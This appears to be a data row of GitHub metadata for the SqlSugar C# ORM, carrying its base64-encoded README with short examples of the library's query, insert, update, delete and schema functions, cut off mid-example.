",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'SqlSugar',38992233,b'Best ORM    Fastest ORM   Simple Easy  Sqlite  orm Oracle ORM Mysql Orm  postgresql ORm  SqlServer oRm     ',b'C#',119,2393,,2393,False,b'https://api.github.com/repos/sunkaixuan/SqlSugar/forks',"IyBTcWxTdWdhciA1LlggIEFQSSAKClVzaW5nIFNxbFN1Z2FyIGlzIHZlcnkg
c2ltcGxlICxBbmQgaXQncyBwb3dlcmZ1bC4KClNxbFN1Z2FyPU9uZSBvYmpl
Y3QrT25lIHBhcmFtZXRlcj0xNiBmdW5jdGlvbnMsCgpTdXBwb3J077yaTXlT
cWzjgIFTcWxTZXJ2ZXLjgIFTcWxpdGXjgIFPcmFjbGUg44CBIHBvc3RncmVz
cWwgCiMjIENvbnRhY3RpbmZvbWF0aW9uICAKRW1haWw6NjEwMjYyMzc0QHFx
LmNvbSAKUVEgR3JvdXA6MjI1OTgyOTg1CgojIyBOdWdldCAKCnwubmV0IHwu
bmV0IGNvcmUgfAp8LS0tLS0tLS0tfCAtLS0tLS0tLS18CnxJbnN0YWxsLVBh
Y2thZ2Ugc3FsU3VnYXIgfEluc3RhbGwtUGFja2FnZSBzcWxTdWdhckNvcmV8
CiAKIyMgU3FsU3VnYXIncyAxNiBGdW5jdGlvbnMKVGhlcmUgYXJlIDE2IG1l
dGhvZHMgdW5kZXIgU3FsU3VnYXJDbGllbnQKIVvovpPlhaXlm77niYfor7Tm
mI5dKGh0dHA6Ly93d3cuY29kZWlzYnVnLmNvbS9fdGhlbWUvdWVkaXRvci91
dGY4LW5ldC9uZXQvdXBsb2FkL2ltYWdlLzIwMTkwNDMwLzYzNjkyMjQwNTY0
OTk4MDI2NzQ3ODI5NTcuanBnP2lkPTExICJzcWxzdWdhciIpCiAKIAoKIyMg
Q3JlYXRlIFNxbFN1Z2FyQ2xpZW50CkFsbCBvcGVyYXRpb25zIGFyZSBiYXNl
ZCBvbiBTcWxTdWdhckNsaWVudAoKU3FsU3VnYXJDbGllbnQgcGFyYW1ldGVy
IGFuZCBvbmx5IG9uZSBDb25uZWN0aW9uQ29uZmlnCmBgYGNzCnB1YmxpYyAg
TGlzdDxTdHVkZW50PiBHZXRTdHVkZW50TGlzdCgpCnsKICAgIHZhciBkYj0g
R2V0SW5zdGFuY2UoKTsKICAgIHZhciBsaXN0PSBkYi5RdWVyeWFibGU8U3R1
ZGVudD4oKS5Ub0xpc3QoKTsvL1NlYXJjaAogICAgcmV0dXJuIGxpc3Q7Cn0K
Ci8vLyA8c3VtbWFyeT4KLy8vIENyZWF0ZSBTcWxTdWdhckNsaWVudAovLy8g
PC9zdW1tYXJ5PgovLy8gPHJldHVybnM+PC9yZXR1cm5zPgpwcml2YXRlIFNx
bFN1Z2FyQ2xpZW50IEdldEluc3RhbmNlKCkKewogICAgU3FsU3VnYXJDbGll
bnQgZGIgPSBuZXcgU3FsU3VnYXJDbGllbnQobmV3IENvbm5lY3Rpb25Db25m
aWcoKQogICAgICAgIHsKICAgICAgICAgICAgQ29ubmVjdGlvblN0cmluZyA9
ICJTZXJ2ZXI9Lnh4eHh4IiwKICAgICAgICAgICAgRGJUeXBlID0gRGJUeXBl
LlNxbFNlcnZlciwKICAgICAgICAgICAgSXNBdXRvQ2xvc2VDb25uZWN0aW9u
ID0gdHJ1ZSwKICAgICAgICAgICAgSW5pdEtleVR5cGUgPSBJbml0S2V5VHlw
ZS5BdHRyaWJ1dGUKICAgICAgICB9KTsKICAgIC8vUHJpbnQgc3FsCiAgICBk
Yi5Bb3AuT25Mb2dFeGVjdXRpbmcgPSAoc3FsLCBwYXJzKSA9PgogICAgewog
ICAgICAgIENvbnNvbGUuV3JpdGVMaW5lKHNxbCArICJcclxuIiArIGRiLlV0
aWxpdGllcy5TZXJpYWxpemVPYmplY3QocGFycy5Ub0RpY3Rpb25hcnkoaXQg
PT4gaXQuUGFyYW1ldGVyTmFtZSwgaXQgPT4gaXQuVmFsdWUpKSk7CiAgICAg
ICAgQ29uc29sZS5Xcml0ZUxpbmUoKTsKICAgIH07CiAgICByZXR1cm4gZGI7
Cn0KCnB1YmxpYyBjbGFzcyBTdHVkZW50CnsKICAgIFtTdWdhckNvbHVtbihJ
c1ByaW1hcnlLZXkgPSB0cnVlLCBJc0lkZW50aXR5ID0gdHJ1ZV0KICAgIHB1
YmxpYyBpbnQgSWQgeyBnZXQ7IHNldDsgfQogICAgcHVibGljIGludD8gU2No
b29sSWQgeyBnZXQ7IHNldDsgfQogICAgcHVibGljIHN0cmluZyBOYW1lIHsg
Z2V0OyBzZXQ7IH0KfQpgYGAKICBbPGZvbnQgY29sb3I9cmVkPlZpZXcgbW9y
ZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1Yi5jb20vc3Vua2FpeHVhbi9T
cWxTdWdhci93aWtpLzAuU3FsU3VnYXJDbGllbnQpIAogCgojIyAgMS4gUXVl
cnlhYmxlCldlIHVzZSBpdCB0byBxdWVyeQogIVvovpPlhaXlm77niYfor7Tm
mI5dKGh0dHA6Ly93d3cuY29kZWlzYnVnLmNvbS9fdGhlbWUvdWVkaXRvci91
dGY4LW5ldC9uZXQvdXBsb2FkL2ltYWdlLzIwMTkwNTAyLzYzNjkyNDA5MzI5
OTczNjMwMzUxOTc0NTkucG5nP2lkPTEgIlF1ZXJ5YWJsZSIpCiAKIyMjIyMg
SGVyZSBhcmUgc29tZSBleGFtcGxlcwpgYGBjcwovL2Vhc3kKdmFyIGdldEFs
bCA9IGRiLlF1ZXJ5YWJsZTxTdHVkZW50PigpLlRvTGlzdCgpOwp2YXIgZ2V0
QWxsTm9Mb2NrID0gZGIuUXVlcnlhYmxlPFN0dWRlbnQ+KCkuV2l0aChTcWxX
aXRoLk5vTG9jaykuVG9MaXN0KCk7CnZhciBnZXRCeVByaW1hcnlLZXkgPSBk
Yi5RdWVyeWFibGU8U3R1ZGVudD4oKS5JblNpbmdsZSgyKTsKdmFyIHN1bSA9
IGRiLlF1ZXJ5YWJsZTxTdHVkZW50PigpLlN1bShpdD0+aXQuSWQpOwp2YXIg
aXNBbnkgPSBkYi5RdWVyeWFibGU8U3R1ZGVudD4oKS5XaGVyZShpdD0+aXQu
SWQ9PS0xKS5BbnkoKTsKdmFyIGlzQW55MiA9IGRiLlF1ZXJ5YWJsZTxTdHVk
ZW50PigpLkFueShpdCA9PiBpdC5JZCA9PSAtMSk7CnZhciBnZXRMaXN0QnlS
ZW5hbWUgPSBkYi5RdWVyeWFibGU8U2Nob29sPigpLkFTKCJTdHVkZW50Iiku
VG9MaXN0KCk7CnZhciBnZXRCeVdoZXJlID0gZGIuUXVlcnlhYmxlPFN0dWRl
bnQ+KCkuV2hlcmUoaXQgPT4gaXQuSWQgPT0gMSB8fCBpdC5OYW1lID09ICJh
IikuVG9MaXN0KCk7CnZhciBnZXRCeUZ1bnMgPSBkYi5RdWVyeWFibGU8U3R1
ZGVudD4oKS5XaGVyZShpdCA9PiBTcWxGdW5jLklzTnVsbE9yRW1wdHkoaXQu
TmFtZSkpLlRvTGlzdCgpOwp2YXIgZ3JvdXAgPSBkYi5RdWVyeWFibGU8U3R1
ZGVudD4oKS5Hcm91cEJ5KGl0ID0+IGl0LklkKS5TZWxlY3QoaXQgPT5uZXcg
eyBpZCA9IFNxbEZ1bmMuQWdncmVnYXRlQ291bnQoaXQuSWQpIH0pLlRvTGlz
dCgpOwoKLy9QYWdlCnZhciBwYWdlID0gZGIuUXVlcnlhYmxlPFN0dWRlbnQ+
KCkuVG9QYWdlTGlzdChwYWdlSW5kZXgsIHBhZ2VTaXplLCByZWYgdG90YWxD
b3VudCk7CgovL3BhZ2Ugam9pbgp2YXIgcGFnZUpvaW4gPSBkYi5RdWVyeWFi
bGU8U3R1ZGVudCwgU2Nob29sPigoc3QsIHNjKSA9Pm5ldyBKb2luUXVlcnlJ
bmZvcyhKb2luVHlwZS5MZWZ0LHN0LlNjaG9vbElkPT1zYy5JZCkpCi5Ub1Bh
Z2VMaXN0KHBhZ2VJbmRleCwgcGFnZVNpemUsIHJlZiB0b3RhbENvdW50KTsK
Ci8vdG9wIDUKdmFyIHRvcDUgPSBkYi5RdWVyeWFibGU8U3R1ZGVudD4oKS5U
YWtlKDUpLlRvTGlzdCgpOwoKLy9qb2luIE9yZGVyIEJ5IChvcmRlciBieSBz
dC5pZCBkZXNjLHNjLmlkIGRlc2MpCnZhciBsaXN0NCA9IGRiLlF1ZXJ5YWJs
ZTxTdHVkZW50LCBTY2hvb2w+KChzdCwgc2MpID0+bmV3ICBKb2luUXVlcnlJ
bmZvcyhKb2luVHlwZS5MZWZ0LHN0LlNjaG9vbElkPT1zYy5JZCkpCi5PcmRl
ckJ5KHN0PT5zdC5JZCxPcmRlckJ5VHlwZS5EZXNjKQouT3JkZXJCeSgoc3Qs
c2MpPT5zYy5JZCxPcmRlckJ5VHlwZS5EZXNjKQouU2VsZWN0PFZpZXdNb2Rl
bFN0dWRlbnQ+KCkuVG9MaXN0KCk7CgpgYGAKWzxmb250IGNvbG9yPXJlZD5W
aWV3IG1vcmUgPj4gPC9mb250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1bmth
aXh1YW4vU3FsU3VnYXIvd2lraS8xLlF1ZXJ5YWJsZSkgCiAKCgogIyMgIDIu
IFVwZGF0ZWFibGUKV2UgdXNlIGl0IHRvIFVwZGF0ZQogYGBgY3MKLy91cGRh
dGUgcmV1dHJuIFVwZGF0ZSBDb3VudAp2YXIgdDE9IGRiLlVwZGF0ZWFibGUo
dXBkYXRlT2JqKS5FeGVjdXRlQ29tbWFuZCgpOwoKLy9Pbmx5ICB1cGRhdGUg
IE5hbWUgCnZhciB0MyA9IGRiLlVwZGF0ZWFibGUodXBkYXRlT2JqKS5VcGRh
dGVDb2x1bW5zKGl0ID0+IG5ldyB7IGl0Lk5hbWUgfSkuRXhlY3V0ZUNvbW1h
bmQoKTsKCi8vSWdub3JlICBOYW1lIGFuZCBUZXN0SWQKdmFyIHQ0ID0gZGIu
VXBkYXRlYWJsZSh1cGRhdGVPYmopLklnbm9yZUNvbHVtbnMoaXQgPT4gbmV3
IHsgaXQuTmFtZSwgaXQuVGVzdElkIH0pLkV4ZWN1dGVDb21tYW5kKCk7Cgov
L3VwZGF0ZSBMaXN0PFQ+CnZhciB0NyA9IGRiLlVwZGF0ZWFibGUodXBkYXRl
T2JqcykuRXhlY3V0ZUNvbW1hbmQoKTsKCi8vV2hlcmUgQnkgRXhwcmVzc2lv
bgp2YXIgdDkgPSBkYi5VcGRhdGVhYmxlKGl0PT5uZXcgY2xhc3MoKSB7IG5h
bWU9ImEiLGNyZWF0ZXRpbWU9cCB9KS5XaGVyZShpdCA9PiBpdC5JZCA9PSAx
KS5FeGVjdXRlQ29tbWFuZCgpOwoKIGBgYAogWzxmb250IGNvbG9yPXJlZD5W
aWV3IG1vcmUgPj4gPC9mb250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1bmth
aXh1YW4vU3FsU3VnYXIvd2lraS8yLlVwZGF0ZWFibGUpIAoKIAojIyAgMy4g
SW5zZXJ0YWJsZQpXZSB1c2UgaXQgdG8gSW5zZXJ0CiBgYGBjcwovL0luc2Vy
dCByZXV0cm4gSW5zZXJ0IENvdW50CnZhciB0MiA9IGRiLkluc2VydGFibGUo
aW5zZXJ0T2JqKS5FeGVjdXRlQ29tbWFuZCgpOwoKLy9JbnNlcnQgcmV1dHJu
IElkZW50aXR5IFZhbHVlCnZhciB0MyA9IGRiLkluc2VydGFibGUoaW5zZXJ0
T2JqKS5FeGVjdXRlUmV1dHJuSWRlbnRpdHkoKTsKCi8vT25seSAgaW5zZXJ0
ICBOYW1lIAp2YXIgdDQgPSBkYi5JbnNlcnRhYmxlKGluc2VydE9iaikuSW5z
ZXJ0Q29sdW1ucyhpdCA9PiBuZXcgeyBpdC5OYW1lLGl0LlNjaG9vbElkIH0p
LkV4ZWN1dGVSZXV0cm5JZGVudGl0eSgpOwoKLy9JZ25vcmUgVGVzdElkCnZh
ciB0NSA9IGRiLkluc2VydGFibGUoaW5zZXJ0T2JqKS5JZ25vcmVDb2x1bW5z
KGl0ID0+IG5ldyB7IGl0Lk5hbWUsIGl0LlRlc3RJZCB9KS5FeGVjdXRlUmV1
dHJuSWRlbnRpdHkoKTsKCi8vSW5zZXJ0IExpc3Q8VD4KdmFyIHM5ID0gZGIu
SW5zZXJ0YWJsZShpbnNlcnRPYmpzKS5JbnNlcnRDb2x1bW5zKGl0ID0+IG5l
dyB7IGl0Lk5hbWUgfSkuRXhlY3V0ZUNvbW1hbmQoKTsKYGBgCiBbPGZvbnQg
Y29sb3I9cmVkPlZpZXcgbW9yZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1
Yi5jb20vc3Vua2FpeHVhbi9TcWxTdWdhci93aWtpLzMuSW5zZXJ0YWJsZSkg
CiAKIyMgIDQuIERlbGV0ZWFibGUKV2UgdXNlIGl0IHRvIERlbGV0ZQoKIGBg
YGNzCiAvL2J5IGVudGl0eQpkYi5EZWxldGVhYmxlPFN0dWRlbnQ+KCkuV2hl
cmUobmV3IFN0dWRlbnQoKSB7IElkID0gMSB9KS5FeGVjdXRlQ29tbWFuZCgp
OwoKLy9ieSBwcmltYXJ5IGtleQpkYi5EZWxldGVhYmxlPFN0dWRlbnQ+KCku
SW4oMSkuRXhlY3V0ZUNvbW1hbmQoKTsKCi8vYnkgcHJpbWFyeSBrZXkgYXJy
YXkKZGIuRGVsZXRlYWJsZTxTdHVkZW50PigpLkluKG5ldyBpbnRbXSB7IDEs
IDIgfSkuRXhlY3V0ZUNvbW1hbmQoKTsKCi8vYnkgZXhwcmVzc2lvbgpkYi5E
ZWxldGVhYmxlPFN0dWRlbnQ+KCkuV2hlcmUoaXQgPT4gaXQuSWQgPT0gMSku
RXhlY3V0ZUNvbW1hbmQoKTsKCiBgYGAKIFs8Zm9udCBjb2xvcj1yZWQ+Vmll
dyBtb3JlID4+IDwvZm9udD5dKGh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4
dWFuL1NxbFN1Z2FyL3dpa2kvNC5EZWxldGVhYmxlICkgCgoKICMjICA1LiBT
cWxRdWVyeWFibGUKYGBgY3MKdmFyIGxpc3QgPSBkYi5TcWxRdWVyeWFibGU8
U3R1ZGVudD4oInNlbGVjdCAqIGZyb20gc3R1ZGVudCIpLlRvUGFnZUxpc3Qo
MSwgMik7CnZhciBsaXN0MiA9IGRiLlNxbFF1ZXJ5YWJsZTxTdHVkZW50Pigi
c2VsZWN0ICogZnJvbSBzdHVkZW50IikuV2hlcmUoaXQ9Pml0LklkPT0xKS5U
b1BhZ2VMaXN0KDEsIDIpOwp2YXIgbGlzdDM9IGRiLlNxbFF1ZXJ5YWJsZTxT
dHVkZW50Pigic2VsZWN0ICogZnJvbSBzdHVkZW50IikuV2hlcmUoImlkPUBp
ZCIsbmV3IHsgaWQ9MX0pLlRvUGFnZUxpc3QoMSwgMik7CmBgYCAKWzxmb250
IGNvbG9yPXJlZD5WaWV3IG1vcmUgPj4gPC9mb250Pl0oaHR0cHM6Ly9naXRo
dWIuY29tL3N1bmthaXh1YW4vU3FsU3VnYXIvd2lraS81LlNxbFF1ZXJ5YWJs
ZSApIAogCiAgIyMgIDYuIFNhdmVRdWV1ZXMKICBQZXJmb3JtIG11bHRpcGxl
IG9wZXJhdGlvbnMgdG9nZXRoZXIgd2l0aCB0cmFuc2FjdGlvbnMKYGBgY3MK
dmFyIGRiID0gR2V0SW5zdGFuY2UoKTsKZGIuSW5zZXJ0YWJsZTxTdHVkZW50
PihuZXcgU3R1ZGVudCgpIHsgTmFtZSA9ICJhIiB9KS5BZGRRdWV1ZSgpOwpk
Yi5JbnNlcnRhYmxlPFN0dWRlbnQ+KG5ldyBTdHVkZW50KCkgeyBOYW1lID0g
ImIiIH0pLkFkZFF1ZXVlKCk7CmRiLlNhdmVRdWV1ZXMoKTsgCgpkYi5JbnNl
cnRhYmxlPFN0dWRlbnQ+KG5ldyBTdHVkZW50KCkgeyBOYW1lID0gImEiIH0p
LkFkZFF1ZXVlKCk7CmRiLkluc2VydGFibGU8U3R1ZGVudD4obmV3IFN0dWRl
bnQoKSB7IE5hbWUgPSAiYiIgfSkuQWRkUXVldWUoKTsKZGIuSW5zZXJ0YWJs
ZTxTdHVkZW50PihuZXcgU3R1ZGVudCgpIHsgTmFtZSA9ICJjIiB9KS5BZGRR
dWV1ZSgpOwpkYi5JbnNlcnRhYmxlPFN0dWRlbnQ+KG5ldyBTdHVkZW50KCkg
eyBOYW1lID0gImQiIH0pLkFkZFF1ZXVlKCk7CnZhciBhciA9IGRiLlNhdmVR
dWV1ZXNBc3luYygpOyAKCmRiLlF1ZXJ5YWJsZTxTdHVkZW50PigpLkFkZFF1
ZXVlKCk7CmRiLlF1ZXJ5YWJsZTxTY2hvb2w+KCkuQWRkUXVldWUoKTsKZGIu
QWRkUXVldWUoInNlbGVjdCAqIGZyb20gc3R1ZGVudCB3aGVyZSBpZD1AaWQi
LCBuZXcgeyBpZCA9IDEgfSk7IAp2YXIgcmVzdWx0MiA9IGRiLlNhdmVRdWV1
ZXM8U3R1ZGVudCwgU2Nob29sLCBTdHVkZW50PigpOyAgCmBgYApbPGZvbnQg
Y29sb3I9cmVkPlZpZXcgbW9yZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1
Yi5jb20vc3Vua2FpeHVhbi9TcWxTdWdhci93aWtpLzYucXVldWUgKSAKCgoj
IyAgNy5BZG8KZGIuQWRvLk1ldGhvZE5hbWXvvIxMb29rIGF0IHRoZSBmb2xs
b3dpbmcgZXhhbXBsZQpgYGBjcwp2YXIgZHQ9ZGIuQWRvLkdldERhdGFUYWJs
ZSgic2VsZWN0ICogZnJvbSB0YWJsZSB3aGVyZSBpZD1AaWQgYW5kIG5hbWU9
QG5hbWUiLG5ldyBMaXN0PFN1Z2FyUGFyYW1ldGVyPigpewogIG5ldyBTdWdh
clBhcmFtZXRlcigiQGlkIiwxKSwKICBuZXcgU3VnYXJQYXJhbWV0ZXIoIkBu
YW1lIiwyKQp9KTsKdmFyIGR0PWRiLkFkby5HZXREYXRhVGFibGUoInNlbGVj
dCAqIGZyb20gdGFibGUgd2hlcmUgaWQ9QGlkIGFuZCBuYW1lPUBuYW1lIixu
ZXd7aWQ9MSxuYW1lPTJ9KTsKCi8vVXNlIFN0b3JlZCBQcm9jZWR1cmUKdmFy
IGR0MiA9IGRiLkFkby5Vc2VTdG9yZWRQcm9jZWR1cmUoKS5HZXREYXRhVGFi
bGUoInNwX3NjaG9vbCIsbmV3e25hbWU9IuW8oOS4iSIsYWdlPTB9KTsvLyAg
R2V0SW50IFNxbFF1ZXJ5PFQ+ICDnrYnnrYnpg73lj6/ku6XnlKgKdmFyIG5h
bWVQPSBuZXcgU3VnYXJQYXJhbWV0ZXIoIkBuYW1lIiwgIuW8oOS4iSIpOwp2
YXIgYWdlUD0gbmV3IFN1Z2FyUGFyYW1ldGVyKCJAYWdlIiwgbnVsbCwgdHJ1
ZSk7Ly9pc091dHB1dD10cnVlCnZhciBkdDIgPSBkYi5BZG8uVXNlU3RvcmVk
UHJvY2VkdXJlKCkuR2V0RGF0YVRhYmxlKCJzcF9zY2hvb2wiLG5hbWVQLGFn
ZVApOwpgYGAKIFs8Zm9udCBjb2xvcj1yZWQ+VmlldyBtb3JlID4+IDwvZm9u
dD5dKGh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4dWFuL1NxbFN1Z2FyL3dp
a2kvNy5hZG8gKSAKIAogIyMgIDguU2F2ZWFibGUKIEluc2VydCBvciBVcGRh
dGUKYGBgY3MKZGIuU2F2ZWFibGU8U3R1ZGVudD4oZW50aXR5KS5FeGVjdXRl
UmV0dXJuRW50aXR5KCk7CmRiLlNhdmVhYmxlPFN0dWRlbnQ+KG5ldyBTdHVk
ZW50KCkgeyBOYW1lID0gIiIgfSkKICAgICAgICAgICAgICAgICAgLkluc2Vy
dENvbHVtbnMoaXQ9Pml0Lk5hbWUpCiAgICAgICAgICAgICAgICAgIC5VcGRh
dGVDb2x1bW5zKGl0PT5uZXcgeyBpdC5OYW1lLGl0LkNyZWF0ZVRpbWUgfQog
ICAgICAgICAgICAgICAgICAuRXhlY3V0ZVJldHVybkVudGl0eSgpOwoKYGBg
Cls8Zm9udCBjb2xvcj1yZWQ+VmlldyBtb3JlID4+IDwvZm9udD5dKGh0dHBz
Oi8vZ2l0aHViLmNvbS9zdW5rYWl4dWFuL1NxbFN1Z2FyL3dpa2kvOC5zYXZl
YWJsZSApIAogCiAgIyMgIDkuRW50aXR5TWFpbgogIGBgYGNzCnZhciBlbnRp
dHlJbmZvPWRiLkVudGl0eU1haW50ZW5hbmNlLkdldEVudGl0eUluZm88U3R1
ZGVudD4oKTsKZm9yZWFjaCAodmFyIGNvbHVtbiBpbiBlbnRpdHlJbmZvLkNv
bHVtbnMpCnsKICAgIENvbnNvbGUuV3JpdGVMaW5lKGNvbHVtbi5Db2x1bW5E
ZXNjcmlwdGlvbik7Cn0KYGBgCls8Zm9udCBjb2xvcj1yZWQ+VmlldyBtb3Jl
ID4+IDwvZm9udD5dKGh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4dWFuL1Nx
bFN1Z2FyL3dpa2kvOS5lbnRpdHlNYWluICkgCgogICMjICAxMC5EYk1haW4K
ICAgYGBgY3MKICB2YXIgdGFibGVzID0gZGIuRGJNYWludGVuYW5jZS5HZXRU
YWJsZUluZm9MaXN0KCk7CiAgZm9yZWFjaCAodmFyIHRhYmxlIGluIHRhYmxl
cykKICB7CiAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUodGFibGUuRGVzY3Jp
cHRpb24pOwogIH0KICBgYGAKICBbPGZvbnQgY29sb3I9cmVkPlZpZXcgbW9y
ZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1Yi5jb20vc3Vua2FpeHVhbi9T
cWxTdWdhci93aWtpL2EuRGJNYWluICkgCiAgCgogICMjICAxMS5Bb3AKICBg
YGBjcwpkYi5Bb3AuT25Mb2dFeGVjdXRlZMKgPcKgKHNxbCzCoHBhcnMpwqA9
PsKgLy9TUUwgZXhlY3V0ZWQgZXZlbnQKewrCoAp9OwpkYi5Bb3AuT25Mb2dF
eGVjdXRpbmfCoD3CoChzcWwswqBwYXJzKcKgPT7CoC8vU1FMIGV4ZWN1dGlu
ZyBldmVudCAocHJlLWV4ZWN1dGlvbikKewrCoAp9OwpkYi5Bb3AuT25FcnJv
csKgPcKgKGV4cCnCoD0+Ly9TUUwgZXhlY3V0aW9uIGVycm9yIGV2ZW50CnsK
wqDCoMKgwqDCoMKgwqDCoMKgwqDCoMKgwqDCoMKgwqDCoAp9OwpkYi5Bb3Au
T25FeGVjdXRpbmdDaGFuZ2VTcWzCoD3CoChzcWwswqBwYXJzKcKgPT7CoC8v
U1FMIGV4ZWN1dGluZyBldmVudCAocHJlLWV4ZWN1dGlvbixTUUwgc2NyaXB0
IGNhbiBiZSBtb2RpZmllZCkKewrCoMKgwqDCoHJldHVybsKgbmV3wqBLZXlW
YWx1ZVBhaXI8c3RyaW5nLMKgU3VnYXJQYXJhbWV0ZXJbXT4oc3FsLHBhcnMp
Owp9OwoKYGBgCiAgWzxmb250IGNvbG9yPXJlZD5WaWV3IG1vcmUgPj4gPC9m
b250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1bmthaXh1YW4vU3FsU3VnYXIv
d2lraS9iLmFvcCApIAoKICAjIyAgMTIuUXVlcnlGaWx0ZXIKICBgYGBjcwoK
IC8vZ29iYWwgZmlsdGVyCnZhciBkYiA9IEdldEluc3RhbmNlKCk7CnZhciBz
cWwgPSBkYi5RdWVyeWFibGU8U3R1ZGVudD4oKS5Ub1NxbCgpOwovL1NFTEVD
VCBbSURdLFtTY2hvb2xJZF0sW05hbWVdLFtDcmVhdGVUaW1lXSBGUk9NIFtT
VHVkZW50XSAgV0hFUkUgIGlzRGVsZXRlPTAgCgoKcHVibGljIHN0YXRpYyBT
cWxTdWdhckNsaWVudCBHZXRJbnN0YW5jZSgpCnsKICAgIFNxbFN1Z2FyQ2xp
ZW50IGRiID0gbmV3IFNxbFN1Z2FyQ2xpZW50KG5ldyBDb25uZWN0aW9uQ29u
ZmlnKCkge3h4eCk7CiAgICAgICAgICAgIGRiLlF1ZXJ5RmlsdGVyLkFkZChu
ZXcgU3FsRmlsdGVySXRlbSgpCiAgICAgICAgICAgICB7CiAgICAgICAgICAg
ICAgICAgRmlsdGVyVmFsdWUgPSBmaWx0ZXJEYiA9PgogICAgICAgICAgICAg
ICAgIHsKICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIG5ldyBTcWxGaWx0
ZXJSZXN1bHQoKSB7IFNxbCA9ICIgaXNEZWxldGU9MCIgfTsKICAgICAgICAg
ICAgICAgICB9CiAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgcmV0dXJu
IGRiOwp9CiBgYGAKICAgWzxmb250IGNvbG9yPXJlZD5WaWV3IG1vcmUgPj4g
PC9mb250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1bmthaXh1YW4vU3FsU3Vn
YXIvd2lraS9jLkdvYmFsRmlsdGVyICkgCiAKICAjIyAgMTMuRGJGaXJzdAog
IGBgYGNzCnZhciBkYiA9IEdldEluc3RhbmNlKCk7Ci8vQ3JlYXRlIGFsbCBj
bGFzcwpkYi5EYkZpcnN0LkNyZWF0ZUNsYXNzRmlsZSgiYzpcXERlbW9cXDEi
KTsKCi8vQ3JlYXRlIHN0dWRlbnQgY2Fsc3NzCmRiLkRiRmlyc3QuV2hlcmUo
IlN0dWRlbnQiKS5DcmVhdGVDbGFzc0ZpbGUoImM6XFxEZW1vXFwyIik7Ci8v
V2hlcmUoYXJyYXkpCgovL01hcHBpbmcgbmFtZQpkYi5NYXBwaW5nVGFibGVz
LkFkZCgiQ2xhc3NTdHVkZW50IiwgIlN0dWRlbnQiKTsKZGIuTWFwcGluZ0Nv
bHVtbnMuQWRkKCJOZXdJZCIsICJJZCIsICJDbGFzc1N0dWRlbnQiKTsKZGIu
RGJGaXJzdC5XaGVyZSgiU3R1ZGVudCIpLkNyZWF0ZUNsYXNzRmlsZSgiYzpc
XERlbW9cXDMiKTsKCi8vUmVtb3ZlIG1hcHBpbmcKZGIuTWFwcGluZ1RhYmxl
cy5DbGVhcigpOwoKLy9DcmVhdGUgY2xhc3Mgd2l0aCBkZWZhdWx0IHZhbHVl
CmRiLkRiRmlyc3QuSXNDcmVhdGVEZWZhdWx0VmFsdWUoKS5DcmVhdGVDbGFz
c0ZpbGUoImM6XFxEZW1vXFw0IiwgIkRlbW8uTW9kZWxzIik7CgoKLy9NYXBw
aW5nIGFuZCBBdHRyaWJ1dGUKZGIuTWFwcGluZ1RhYmxlcy5BZGQoIkNsYXNz
U3R1ZGVudCIsICJTdHVkZW50Iik7CmRiLk1hcHBpbmdDb2x1bW5zLkFkZCgi
TmV3SWQiLCAiSWQiLCAiQ2xhc3NTdHVkZW50Iik7CmRiLkRiRmlyc3QuSXND
cmVhdGVBdHRyaWJ1dGUoKS5XaGVyZSgiU3R1ZGVudCIpLkNyZWF0ZUNsYXNz
RmlsZSgiYzpcXERlbW9cXDUiKTsKCgpgYGAKICAgWzxmb250IGNvbG9yPXJl
ZD5WaWV3IG1vcmUgPj4gPC9mb250Pl0oaHR0cHM6Ly9naXRodWIuY29tL3N1
bmthaXh1YW4vU3FsU3VnYXIvd2lraS9kLkRiRmlyc3QgKSAKCgogICMjICAx
NC5Db2RlRmlyc3QKYGBgY3MKZGIuQ29kZUZpcnN0LlNldFN0cmluZ0RlZmF1
bHRMZW5ndGgoMTAwKS5CYWNrdXBUYWJsZSgpLkluaXRUYWJsZXModHlwZW9m
KENvZGVUYWJsZSksdHlwZW9mKENvZGVUYWJsZTIpKTsgLy9jaGFuZ2UgZW50
aXR5IGJhY2t1cFRhYmxlCmRiLkNvZGVGaXJzdC5TZXRTdHJpbmdEZWZhdWx0
TGVuZ3RoKDEwMCkuSW5pdFRhYmxlcyh0eXBlb2YoQ29kZVRhYmxlKSwgdHlw
ZW9mKENvZGVUYWJsZTIpKTsKYGBgCiAgIFs8Zm9udCBjb2xvcj1yZWQ+Vmll
dyBtb3JlID4+IDwvZm9udD5dKGh0dHBzOi8vZ2l0aHViLmNvbS9zdW5rYWl4
dWFuL1NxbFN1Z2FyL3dpa2kvZS5Db2RlRmlyc3QgKSAKCiAgIyMgIDE1LlV0
aWxpdGllcwogIGBgYGNzCnZhciBsaXN0ID0gZGIuVXRpbGl0aWVzLkRhdGFU
YWJsZVRvTGlzdChkYXRhdGFibGUpOwogIGBgYAogIApbPGZvbnQgY29sb3I9
cmVkPlZpZXcgbW9yZSA+PiA8L2ZvbnQ+XShodHRwczovL2dpdGh1Yi5jb20v
c3Vua2FpeHVhbi9TcWxTdWdhci93aWtpL2YuVXRpbGl0aWVzICkgCgoKICAj
IyAgMTYuU2ltcGxlQ2xpZW50CmBgYGNzCnZhciBkYiA9IEdldEluc3RhbmNl
KCk7CnZhciBzZGIgPSBkYi5HZXRTaW1wbGVDbGllbnQ8U3R1ZGVudD4oKTsK
c2RiLkdldEJ5SWQoMSk7CnNkYi5HZXRMaXN0KCk7CnNkYi5EZWxldGVCeUlk
